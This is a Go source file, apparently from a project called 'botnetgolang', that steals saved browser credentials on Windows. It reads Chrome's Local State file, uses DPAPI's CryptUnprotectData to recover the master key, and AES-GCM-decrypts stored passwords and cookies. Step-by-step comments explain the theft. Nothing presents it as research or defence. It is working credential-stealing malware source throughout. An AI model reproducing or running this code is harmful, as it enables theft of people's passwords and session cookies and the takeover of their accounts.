package pkg

import (
	"botnetgolang/internal/model"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func GetMasterKey(localStatePath string) ([]byte, error) {

	var masterKey []byte

	// Get the master key
	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
	jsonFile, err := os.Open(localStatePath) // The rough key is stored in the Local State File which is a json file
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)                      // It's stored in Base64 so.. Let's decode it
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI") // The key is encrypted using the windows DPAPI method and signed with it. the key looks like "DPAPI05546sdf879z456..." Let's Remove DPAPI.

	masterKey, err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil
}

func GetInfo(info *model.Info, path string, masterKey []byte) *model.Info {
	if strings.HasPrefix(info.Pass, "v10") {
		info.Pass = strings.Trim(info.Pass, "v10")
		//fmt.Println("Chrome Version is 80 or higher, switching to the AES 256 decrypt.")
		if string(masterKey) != "" {
			ciphertext := []byte(info.Pass)
			c, err := aes.NewCipher(masterKey)
			if err != nil {

				fmt.Println(err)
			}
			gcm, err := cipher.NewGCM(c)
			if err != nil {
				fmt.Println(err)
			}
			nonceSize := gcm.NonceSize()
			if len(ciphertext) < nonceSize {
				fmt.Println(err)
			}

			nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
			plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
			info.Pass = string(plaintext)
			if err != nil {
				fmt.Println(err)
			}
			if string(plaintext) != "" {
				return info
			}
		} else { // It the masterkey hasn't been requested yet, then gets it.
			mkey, err := GetMasterKey(path)
			if err != nil {
				fmt.Println(err)
			}
			masterKey = mkey
		}
	} else { //Means it's chrome v. < 80
		pass, err := Decrypt([]byte(info.Pass))
		if err != nil {
			log.Fatal(err)
		}

		if info.Url != "" && info.Url != "" && string(pass) != "" {
			info.Pass = string(pass)
			return info
		}
	}
	return nil
}

func GetCookie(info *model.Cookie, path string, masterKey []byte) *model.Cookie {
	if strings.HasPrefix(info.Value, "v10") { // Means it's chrome 80 or higher

		info.Value = strings.Trim(info.Value, "v10")

		//fmt.Println("Chrome Version is 80 or higher, switching to the AES 256 decrypt.")
		if string(masterKey) != "" {
			ciphertext := []byte(info.Value)
			c, err := aes.NewCipher(masterKey)
			if err != nil {

				fmt.Println(err)
			}
			gcm, err := cipher.NewGCM(c)
			if err != nil {
				fmt.Println(err)
			}
			nonceSize := gcm.NonceSize()
			if len(ciphertext) < nonceSize {
				fmt.Println(err)
			}

			nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
			plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
			info.Value = string(plaintext)
			if err != nil {
				fmt.Println(err)
			}
			if string(plaintext) != "" {
				return info
			}

		} else { // It the masterkey hasn't been requested yet, then gets it.
			mkey, err := GetMasterKey(path)
			if err != nil {
				fmt.Println(err)
			}
			masterKey = mkey
		}
	} else { //Means it's chrome v. < 80
		value, err := Decrypt([]byte(info.Value))
		if err != nil {
			log.Fatal(err)
		}
		info.Value = string(value)
		return info
	}

	//Check if no value, if none skip
	return nil
}
